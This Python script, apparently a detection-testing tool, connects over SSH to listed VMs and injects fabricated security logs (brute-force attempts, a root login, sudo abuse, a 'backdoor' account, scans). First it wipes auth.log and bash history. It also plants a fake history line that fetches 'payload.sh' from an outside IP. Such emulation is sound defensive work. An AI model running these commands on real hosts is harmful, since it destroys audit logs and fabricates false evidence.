import os
import json
from fabric import Connection, Config

def load_vms():
    """Loads target VM configurations from vms.json."""
    try:
        with open("vms.json", "r") as f:
            return json.load(f)
    except Exception as e:
        print(f"[!] Error loading vms.json: {e}")
        return []

def populate_logs(vm):
    """Injects simulated malicious logs into the target VM to test detection rules."""
    print(f"[*] Injecting simulated threat telemetry on {vm['name']} ({vm['host']})...")
    
    connect_kwargs = {}
    if vm.get("key_path"):
        connect_kwargs["key_filename"] = vm.get("key_path")
    if vm.get("password"):
        connect_kwargs["password"] = vm.get("password")

    try:
        # Prevent decoding issues on certain Linux distributions
        custom_config = Config(overrides={'run': {'encoding': 'latin-1'}, 'sudo': {'encoding': 'latin-1'}})
        conn = Connection(
            host=vm["host"], 
            user=vm["username"], 
            port=vm.get("port", 22),
            connect_kwargs=connect_kwargs, 
            connect_timeout=10, 
            config=custom_config
        )

        pwd = vm.get("password", "")

        # List of commands to inject raw logs directly into the target files
        cmds = [
            # 1. Clear existing logs for a fresh test
            "> /var/log/auth.log 2>/dev/null",
            "> ~/.bash_history 2>/dev/null",
            
            # 2. Simulate Command & Control (C2) / Downloader activity in bash history
            "echo 'wget http://185.220.101.1/payload.sh' >> ~/.bash_history",
            "echo 'python -c \"import socket\"' >> ~/.bash_history"
        ]
        
        # 3. Simulate SSH Brute Force (Triggers HIGH severity)
        for i in range(1, 13):
            cmds.append(f"echo '$(date \"+%b %d %H:%M:%S\") target_vm sshd[10{i}]: Failed password for invalid user root from 185.220.101.42 port 500{i} ssh2' >> /var/log/auth.log")
        
        # 4. Simulate Successful Login after Brute Force (Triggers CRITICAL severity correlation)
        cmds.append("echo '$(date \"+%b %d %H:%M:%S\") target_vm sshd[200]: Accepted password for root from 185.220.101.42 port 54321 ssh2' >> /var/log/auth.log")
        
        # 5. Simulate Sudo Abuse (Triggers MEDIUM severity)
        cmds.append("echo '$(date \"+%b %d %H:%M:%S\") target_vm sudo: baduser : user NOT in sudoers ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash' >> /var/log/auth.log")
        
        # 6. Simulate Account Persistence (Triggers HIGH severity)
        cmds.append("echo '$(date \"+%b %d %H:%M:%S\") target_vm useradd[300]: new user: name=backdoor, UID=1337, GID=1337, home=/home/backdoor, shell=/bin/bash' >> /var/log/auth.log")
        
        # 7. Simulate Network Scanning (Triggers LOW severity)
        for i in range(1, 7):
            cmds.append(f"echo '$(date \"+%b %d %H:%M:%S\") target_vm sshd[40{i}]: Connection closed by 185.220.101.99 port 400{i} [preauth]' >> /var/log/auth.log")
        
        # 8. Simulate Normal Baseline Activity (Triggers INFO)
        cmds.append("echo '$(date \"+%b %d %H:%M:%S\") target_vm systemd-logind[500]: New session 42 of user syslog.' >> /var/log/auth.log")
        
        # 9. Mirror auth.log to secure to support RHEL-based systems
        cmds.append("cat /var/log/auth.log > /var/log/secure 2>/dev/null")

        # Combine all commands into a single execution string
        full_cmd = " ; ".join(cmds) 

        # Execute payload with proper privilege escalation handling
        if pwd:
            conn.run(f"echo '{pwd}' | sudo -S sh -c '{full_cmd}'", hide=True, warn=True)
        else:
            conn.run(f"sudo sh -c '{full_cmd}' || sh -c '{full_cmd}'", hide=True, warn=True)

        print(f"[OK] Telemetry injected successfully on {vm['name']}.")
        conn.close()

    except Exception as e:
        print(f"[!] Failed to prepare {vm['name']}: {e}")

if __name__ == "__main__":
    print("--- Starting Threat Emulation ---")
    for vm in load_vms():
        populate_logs(vm)
    print("--- Emulation Complete! ---")